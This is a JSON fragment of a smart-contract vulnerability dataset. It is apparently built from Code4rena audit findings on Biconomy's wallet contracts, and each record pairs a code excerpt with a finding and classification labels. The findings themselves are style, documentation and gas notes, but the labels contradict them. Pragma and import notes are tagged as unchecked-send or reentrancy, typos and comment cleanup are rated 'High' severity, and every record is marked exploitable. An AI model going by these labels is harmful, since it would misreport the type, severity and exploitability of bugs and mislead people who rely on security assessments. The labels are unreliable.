    "code": "solidity\nFile: contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol\n6: pragma solidity ^0.8.12;\n\nFile: contracts/smart-contract-wallet/aa-4337/core/SenderCreator.sol\n2: pragma solidity ^0.8.12;\n\nFile: contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol\n2: pragma solidity ^0.8.12;\n\nFile: contracts/smart-contract-wallet/aa-4337/interfaces/IAggregator.sol\n2: pragma solidity 0.8.12;\n\nFile: contracts/smart-contract-wallet/aa-4337/utils/Exec.sol\n2: pragma solidity >=0.7.5 <0.9.0;\n\nFile: contracts/smart-contract-wallet/base/Executor.sol\n2: pragma solidity 0.8.12;\n\nFile: contracts/smart-contract-wallet/base/FallbackManager.sol\n2: pragma solidity 0.8.12;\n\nFile: contracts/smart-contract-wallet/base/ModuleManager.sol\n2: pragma solidity 0.8.12;\n\nFile: contracts/smart-contract-wallet/common/Enum.sol\n2: pragma solidity 0.8.12;\n\nFile: contracts/smart-contract-wallet/common/SecuredTokenTransfer.sol\n2: pragma solidity 0.8.12;\n\nFile: contracts/smart-contract-wallet/common/SignatureDecoder.sol\n2: pragma solidity 0.8.12;\n\nFile: contracts/smart-contract-wallet/common/Singleton.sol\n2: pragma solidity 0.8.12;\n\nFile: contracts/smart-contract-wallet/handler/DefaultCallbackHandler.sol\n2: pragma solidity 0.8.12;\n\nFile: contracts/smart-contract-wallet/libs/LibAddress.sol\n2: pragma solidity 0.8.12;\n\nFile: contracts/smart-contract-wallet/libs/Math.sol\n4: pragma solidity 0.8.12;\n\nFile: contracts/smart-contract-wallet/libs/MultiSend.sol\n2: pragma solidity 0.8.12;\n\nFile: contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol\n2: pragma solidity 0.8.12;\n\nFile: contracts/smart-contract-wallet/paymasters/PaymasterHelpers.sol\n2: pragma solidity 0.8.12;\n\nFile: contracts/smart-contract-wallet/BaseSmartAccount.sol\n2: pragma solidity 0.8.12;\n\nFile: contracts/smart-contract-wallet/Proxy.sol\n2: pragma solidity 0.8.12;\n\nFile: contracts/smart-contract-wallet/SmartAccount.sol\n2: pragma solidity 0.8.12;\n\nFile: contracts/smart-contract-wallet/SmartAccountFactory.sol\n2: pragma solidity 0.8.12;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "NC-06 Update pragma versioning to a more recent version like 0.8.16",
    "description": "Consider a newer version to take advantage of some bug fixes to the compiler. https://docs.soliditylang.org/en/v0.8.17/bugs.html File: contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol 6: pragma solidity ^0.8.12; File: contracts/smart-contract-wallet/aa-4337/core/SenderCreator.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 68,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol\n12: import \"../interfaces/IAccount.sol\";\n13: import \"../interfaces/IPaymaster.sol\";\n15: import \"../interfaces/IAggregatedAccount.sol\";\n16: import \"../interfaces/IEntryPoint.sol\";\n17: import \"../utils/Exec.sol\";\n18: import \"./StakeManager.sol\";\n19: import \"./SenderCreator.sol\";\n\nFile: contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol\n4: import \"../interfaces/IStakeManager.sol\";\n\nFile: contracts/smart-contract-wallet/aa-4337/interfaces/IAccount.sol\n4: import \"./UserOperation.sol\";\n\nFile: contracts/smart-contract-wallet/aa-4337/interfaces/IAggregatedAccount.sol\n4: import \"./UserOperation.sol\";\n5: import \"./IAccount.sol\";\n6: import \"./IAggregator.sol\";\n\nFile: contracts/smart-contract-wallet/aa-4337/interfaces/IAggregator.sol\n4: import \"./UserOperation.sol\";\n\nFile: contracts/smart-contract-wallet/aa-4337/interfaces/IEntryPoint.sol\n12: import \"./UserOperation.sol\";\n13: import \"./IStakeManager.sol\";\n14: import \"./IAggregator.sol\";\n\nFile: contracts/smart-contract-wallet/aa-4337/interfaces/IPaymaster.sol\n4: import \"./UserOperation.sol\";\n\nFile: contracts/smart-contract-wallet/base/Executor.sol\n4: import \"../common/Enum.sol\";\n\nFile: contracts/smart-contract-wallet/base/FallbackManager.sol\n4: import \"../common/SelfAuthorized.sol\";\n\nFile: contracts/smart-contract-wallet/base/ModuleManager.sol\n4: import \"../common/Enum.sol\";\n5: import \"../common/SelfAuthorized.sol\";\n6: import \"./Executor.sol\";\n\nFile: contracts/smart-contract-wallet/handler/DefaultCallbackHandler.sol\n4: import \"../interfaces/ERC1155TokenReceiver.sol\";\n5: import \"../interfaces/ERC721TokenReceiver.sol\";\n6: import \"../interfaces/ERC777TokensRecipient.sol\";\n7: import \"../interfaces/IERC165.sol\";\n\nFile: contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol\n5: import \"../../BasePaymaster.sol\";\n6: import \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\n7: import \"@openzeppelin/contracts/proxy/utils/Initializable.sol\";\n8: import \"@openzeppelin/contracts/utils/Address.sol\";\n9: import \"../../PaymasterHelpers.sol\";\n\nFile: contracts/smart-contract-wallet/paymasters/BasePaymaster.sol\n7: import \"@openzeppelin/contracts/access/Ownable.sol\";\n8: import \"@account-abstraction/contracts/interfaces/IPaymaster.sol\";\n9: import \"@account-abstraction/contracts/interfaces/IEntryPoint.sol\";\n\nFile: contracts/smart-contract-wallet/paymasters/PaymasterHelpers.sol\n4: import \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\n5: import \"@account-abstraction/contracts/interfaces/UserOperation.sol\";\n\nFile: contracts/smart-contract-wallet/BaseSmartAccount.sol\n08: import \"@account-abstraction/contracts/interfaces/IAccount.sol\";\n09: import \"@account-abstraction/contracts/interfaces/IEntryPoint.sol\";\n10: import \"./common/Enum.sol\";\n\nFile: contracts/smart-contract-wallet/SmartAccount.sol\n03: import \"./libs/LibAddress.sol\";\n04: import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n05: import \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n06: import \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";\n07: import \"./BaseSmartAccount.sol\";\n08: import \"./common/Singleton.sol\";\n09: import \"./base/ModuleManager.sol\";\n10: import \"./base/FallbackManager.sol\";\n11: import \"./common/SignatureDecoder.sol\";\n12: import \"./common/SecuredTokenTransfer.sol\";\n13: import \"./interfaces/ISignatureValidator.sol\";\n14: import \"./interfaces/IERC165.sol\";\n15: import \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\n\nFile: contracts/smart-contract-wallet/SmartAccountFactory.sol\n4: import \"./Proxy.sol\";\n5: import \"./BaseSmartAccount.sol\"; \n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "NC-07 Use specific imports instead of just a global import",
    "description": "For a better better developer experience it's better to use specific imports instead of just a global import. This helps to have a better overview what is realy needed and helps to have a clearer view of the contract. File: contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol 12: import \"../interfaces/IAccount.sol\"; 13: import \"../interfaces/IPaymaster.sol\"; 15: import \"../interfaces/IAggregatedAccount.sol\";",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 89,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "File: scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IEntryPoint.sol\n28:     event UserOperationEvent(bytes32 indexed userOpHash, address indexed sender, address indexed paymaster, uint256 nonce, bool success, uint256 actualGasCost, uint256 actualGasUsed);\n\nFile: scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/UserOperation.sol\n16:      * @param paymasterAndData if set, this field hold the paymaster address and \"paymaster-specific-data\". the paymaster will pay for the transaction instead of the sender\n\nFile: scw-contracts/contracts/smart-contract-wallet/interfaces/ERC1155TokenReceiver.sol\n10:         @dev An ERC1155-compliant smart contract MUST call this function on the token recipient contract, at the end of a `safeTransferFrom` after the balance has been updated.\n\nFile: scw-contracts/contracts/smart-contract-wallet/interfaces/ERC1155TokenReceiver.sol\n31:         @dev An ERC1155-compliant smart contract MUST call this function on the token recipient contract, at the end of a `safeBatchTransferFrom` after the balances have been updated.\n\nFile: scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol\n44:     // review? if rename wallet to account is must\n45:     // keccak256(\n46:     //     \"AccountTx(address to,uint256 value,bytes data,uint8 operation,uint256 targetTxGas,uint256 baseGas,uint256 gasPrice,address gasToken,address refundReceiver,uint256 nonce)\"\n47:     // );\n\nFile: scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol\n239:                 payment = handlePayment(startGas - gasleft(), refundInfo.baseGas, refundInfo.gasPrice, refundInfo.tokenGasPriceFactor, refundInfo.gasToken, refundInfo.refundReceiver);\n\nFile: scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol\n489:     function execFromEntryPoint(address dest, uint value, bytes calldata func, Enum.Operation operation, uint256 gasLimit) external onlyEntryPoint returns (bool success) {        ",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "NC-08 Long lines",
    "description": "Usually lines in source code are limited to 80 characters. Today\u2019s screens are much larger so it\u2019s reasonable to stretch this in some cases. Since the files will most likely reside in GitHub, and GitHub starts using a scroll bar in all cases when the length is over [164](https://github.com/aizatto/character-length) characters, the lines below should be split when they reach that length File: scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IEntryPoint.sol 28:     event UserOperationEvent(bytes32 indexed userOpHash, address indexed sender, address indexed paymaster, uint256 nonce, bool success, uint256 actualGasCost, uint256 actualGasUsed); File: scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/UserOperation.sol 16:      * @param paymasterAndData if set, this field hold the paymaster address and \"paymaster-specific-data\". the paymaster will pay for the transaction instead of the sender",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 23,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: BaseSmartAccount.sol\n41:     function nonce() public view virtual returns (uint256);\n\nFile: BaseSmartAccount.sol\n47:     function nonce(uint256 _batchId) public view virtual returns (uint256);\n\nFile: BaseSmartAccount.sol\n53:     function entryPoint() public view virtual returns (IEntryPoint);\n\nFile: BaseSmartAccount.sol\n60:     function validateUserOp(UserOperation calldata userOp, bytes32 userOpHash, address aggregator, uint256 missingAccountFunds)\n61:     external override virtual returns (uint256 deadline) {\n\nFile: BaseSmartAccount.sol\n114:     function init(address _owner, address _entryPointAddress, address _handler) external virtual;\n\nFile: BaseSmartAccount.sol\n116:     function execTransaction(\n117:         Transaction memory _tx,\n118:         uint256 batchId,\n119:         FeeRefund memory refundInfo,\n120:         bytes memory signatures) public payable virtual returns (bool success);\n\nFile: EntryPoint.sol\n168:     function innerHandleOp(bytes calldata callData, UserOpInfo memory opInfo, bytes calldata context) external returns (uint256 actualGasCost) {\n\nFile: EntryPoint.sol\n196:     function getUserOpHash(UserOperation calldata userOp) public view returns (bytes32) {\n\nFile: ERC777TokensRecipient.sol\n5:     function tokensReceived(\n\nFile: IAggregatedAccount.sol\n17:     function getAggregator() external view returns (address);\n\nFile: IERC165.sol\n14:     function supportsInterface(bytes4 interfaceId) external view returns (bool);\n\nFile: ISignatureValidator.sol\n19:     function isValidSignature(bytes memory _data, bytes memory _signature) public view virtual returns (bytes4);\n\nFile: IStakeManager.sol\n67:     function getDepositInfo(address account) external view returns (DepositInfo memory info);\n\nFile: IStakeManager.sol\n70:     function balanceOf(address account) external view returns (uint256);\n\nFile: IStakeManager.sol\n75:     function depositTo(address account) external payable;\n\nFile: ModuleManager.sol\n61:     function execTransactionFromModule(\n62:         address to,\n63:         uint256 value,\n64:         bytes memory data,\n65:         Enum.Operation operation\n66:     ) public virtual returns (bool success) {\n\nFile: ModuleManager.sol\n80:     function execTransactionFromModuleReturnData(\n81:         address to,\n82:         uint256 value,\n83:         bytes memory data,\n84:         Enum.Operation operation\n85:     ) public returns (bool success, bytes memory returnData) {\n\nFile: ModuleManager.sol\n105:     function isModuleEnabled(address module) public view returns (bool) {\n\nFile: SmartAccount.sol\n93:    function nonce() public view virtual override returns (uint256) {\n\nFile: SmartAccount.sol\n97:     function nonce(uint256 _batchId) public view virtual override returns (uint256) {\n\nFile: SmartAccount.sol\n101:     function entryPoint() public view virtual override returns (IEntryPoint) {\n\nFile: SmartAccount.sol\n109:     function setOwner(address _newOwner) external mixedAuth {\n\nFile: SmartAccount.sol\n127:     function updateEntryPoint(address _newEntryPoint) external mixedAuth {\n\nFile: SmartAccount.sol\n135:     function domainSeparator() public view returns (bytes32) {\n\nFile: SmartAccount.sol\n140:     function getChainId() public view returns (uint256) {\n\nFile: SmartAccount.sol\n166:     function init(address _owner, address _entryPointAddress, address _handler) public override initializer { \n\nFile: SmartAccount.sol\n192:     function execTransaction(\n193:         Transaction memory _tx,\n194:         uint256 batchId,\n195:         FeeRefund memory refundInfo,\n196:         bytes memory signatures\n197:     ) public payable virtual override returns (bool success) {\n\nFile: SmartAccount.sol\n271:     function handlePaymentRevert(\n272:         uint256 gasUsed,\n273:         uint256 baseGas,\n274:         uint256 gasPrice,\n275:         uint256 tokenGasPriceFactor,\n276:         address gasToken,\n277:         address payable refundReceiver\n278:     ) external returns (uint256 payment) {\n\nFile: SmartAccount.sol\n302:     function checkSignatures(\n303:         bytes32 dataHash,\n304:         bytes memory data,\n305:         bytes memory signatures\n306:     ) public view virtual {\n\nFile: SmartAccount.sol\n389:     function getTransactionHash(\n390:         address to,\n391:         uint256 value,\n392:         bytes calldata data,\n393:         Enum.Operation operation,\n394:         uint256 targetTxGas,\n395:         uint256 baseGas,\n396:         uint256 gasPrice,\n397:         uint256 tokenGasPriceFactor,\n398:         address gasToken,\n399:         address payable refundReceiver,\n400:         uint256 _nonce\n401:     ) public view returns (bytes32) {\n\nFile: SmartAccount.sol\n449:     function transfer(address payable dest, uint amount) external nonReentrant onlyOwner {\n\nFile: SmartAccount.sol\n455:     function pullTokens(address token, address dest, uint256 amount) external onlyOwner {\n\nFile: SmartAccount.sol\n460:     function execute(address dest, uint value, bytes calldata func) external onlyOwner{\n\nFile: SmartAccount.sol\n465:     function executeBatch(address[] calldata dest, bytes[] calldata func) external onlyOwner{\n\nFile: SmartAccount.sol\n489:     function execFromEntryPoint(address dest, uint value, bytes calldata func, Enum.Operation operation, uint256 gasLimit) external onlyEntryPoint returns (bool success) {        \n\nFile: SmartAccount.sol\n518:     function getDeposit() public view returns (uint256) {\n\nFile: SmartAccountFactory.sol\n33:     function deployCounterFactualWallet(address _owner, address _entryPoint, address _handler, uint _index) public returns(address proxy){\n\nFile: SmartAccountFactory.sol\n53:     function deployWallet(address _owner, address _entryPoint, address _handler) public returns(address proxy){ \n\nFile: SmartAccountFactory.sol\n68:     function getAddressForCounterfactualWallet(address _owner, uint _index) external view returns (address _wallet) {\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "NC-09 Add missing documentation",
    "description": "The contracts are good documented and clear to read but not in an expected NatSpec way. For a better developer experience you should try to follow the NatSpec-Documentation for all public functions. Functions missing @param (or wrong param mentioned) / @return / @notice or is missing complete File: BaseSmartAccount.sol 41:     function nonce() public view virtual returns (uint256); File: BaseSmartAccount.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 161,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: Exec.sol\n39:     // get returned data from last call or calldelegate // @audit-info calldelegate != delegatecall\n\nFile: IAggregatedAccount.sol\n10:  * - the validateUserOp MUST valiate the aggregator parameter, and MAY ignore the userOp.signature field. // @audit-info valiate != validate\n\nFile: SmartAccount.sol\n228:             // We only substract 2500 (compared to the 3000 before) to ensure that the amount passed is still higher than targetTxGas // @audit-info substract != subtract\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "NC-10 Typos",
    "description": "There are some typos. File: Exec.sol 39:     // get returned data from last call or calldelegate // @audit-info calldelegate != delegatecall File: IAggregatedAccount.sol 10:  * - the validateUserOp MUST valiate the aggregator parameter, and MAY ignore the userOp.signature field. // @audit-info valiate != validate",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 11,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.504,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "diff\ndiff --git a/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol b/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol\nindex 7716a01..fb5e334 100644\n--- a/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol\n+++ b/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol\n@@ -39,22 +39,22 @@ contract VerifyingSingletonPaymaster is BasePaymaster {\n     }\n \n     function deposit() public virtual override payable {\n-        revert(\"Deposit must be for a paymasterId. Use depositFor\");\n+        revert(\"VerifyingPaymaster: deposit must be for a paymasterId. Use depositFor\");\n     }\n \n     /**\n      * add a deposit for this paymaster and given paymasterId (Dapp Depositor address), used for paying for transaction fees\n      */\n     function depositFor(address paymasterId) public payable {\n-        require(!Address.isContract(paymasterId), \"Paymaster Id can not be smart contract address\");\n-        require(paymasterId != address(0), \"Paymaster Id can not be zero address\");\n+        require(!Address.isContract(paymasterId), \"VerifyingPaymaster: paymaster Id can not be smart contract address\");\n+        require(paymasterId != address(0), \"VerifyingPaymaster: paymaster Id can not be zero address\");\n         paymasterIdBalances[paymasterId] += msg.value;\n         entryPoint.depositTo{value : msg.value}(address(this));\n     }\n \n     function withdrawTo(address payable withdrawAddress, uint256 amount) public override {\n         uint256 currentBalance = paymasterIdBalances[msg.sender];\n-        require(amount <= currentBalance, \"Insufficient amount to withdraw\");\n+        require(amount <= currentBalance, \"VerifyingPaymaster: insufficient amount to withdraw\");\n         paymasterIdBalances[msg.sender] -= amount;\n         entryPoint.withdrawTo(withdrawAddress, amount);\n     }\n@@ -106,7 +106,7 @@ contract VerifyingSingletonPaymaster is BasePaymaster {\n         // we only \"require\" it here so that the revert reason on invalid signature will be of \"VerifyingPaymaster\", and not \"ECDSA\"\n         require(sigLength == 64 || sigLength == 65, \"VerifyingPaymaster: invalid signature length in paymasterAndData\");\n         require(verifyingSigner == hash.toEthSignedMessageHash().recover(paymasterData.signature), \"VerifyingPaymaster: wrong signature\");\n-        require(requiredPreFund <= paymasterIdBalances[paymasterData.paymasterId], \"Insufficient balance for paymaster id\");\n+        require(requiredPreFund <= paymasterIdBalances[paymasterData.paymasterId], \"VerifyingPaymaster: insufficient balance for paymaster id\");\n         return (userOp.paymasterContext(paymasterData), 0);\n     }\n \n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "4. Enforce consistent error messages throughout the code",
    "description": "Because this project is heavily influenced by the `eth-infinitism/account-abstraction`'s sample code, additional error messages included by the Biconomy project are inconsistent with existing ones. It is recommended to refactor them in order to keep the codebase consistent: diff --git a/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol b/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol index 7716a01..fb5e334 100644 --- a/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol +++ b/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 43,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "diff\ndiff --git a/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol b/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol\nindex 7716a01..15ff91e 100644\n--- a/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol\n+++ b/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol\n@@ -122,7 +122,6 @@ contract VerifyingSingletonPaymaster is BasePaymaster {\n     uint256 actualGasCost\n   ) internal virtual override {\n     (mode);\n-    // (mode,context,actualGasCost); // unused params\n     PaymasterContext memory data = context.decodePaymasterContext();\n     address extractedPaymasterId = data.paymasterId;\n     paymasterIdBalances[extractedPaymasterId] -= actualGasCost;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "High",
    "title": "5. Remove misleading comments",
    "description": "Because this project is heavily influenced by the `eth-infinitism/account-abstraction`'s sample code, some comments are left out even after code changes by the Biconomy project. As a result, they are misleading with regard to the implementation. It is recommended to refactor them in order to keep the codebase easy to understand: diff --git a/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol b/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol index 7716a01..15ff91e 100644 --- a/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol +++ b/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 15,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.892,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nAffaected Code:\n* https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/libs/Math.sol#L148\n* https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/libs/Math.sol#L210-L237\n*https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/libs/Math.sol#L263-L286\n*https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L81\n*https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L101\n*https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L135\n*https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L468\n\nTotal gas saved = 15x7 = 35\n\n\nUse ",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Use ++i instead of i++ to save gas",
    "description": "=============== this gas optimization can be done in the following lines: `https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L74` `https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L80` `https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L99`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.98,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n\nhttps://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/test/MockToken.sol\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "L-01 `_safeMint()` should be used rather than `_mint()` wherever possible",
    "description": "12: _mint(sender, amount); https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/test/MockToken.sol 17: _mint(sender, amount); 22: _mint(_for, amount); https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/test/StakedTestToken.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.125,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n16: assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1));\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "L-02 `require()` should be used instead of `assert()`",
    "description": "16: assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1)); https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/Proxy.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.115,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n\nhttps://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "L-03 Unused `receive()`/`fallback()` function",
    "description": "If the intention is for the Ether to be used, the function should call another function, otherwise it should revert (e.g. require(msg.sender == address(weth))). Having no access control on the function means that someone may send Ether to the contract, and have no way to get anything back out, which is a loss of funds 550: receive() external payable {} https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol 540: receive() external payable {} https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.123,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n17: token.approve(paymaster, type(uint256).max);\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "L-04 Approve return values aren't checked",
    "description": "17: token.approve(paymaster, type(uint256).max); https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/samples/SimpleAccountForTokens.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.058,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
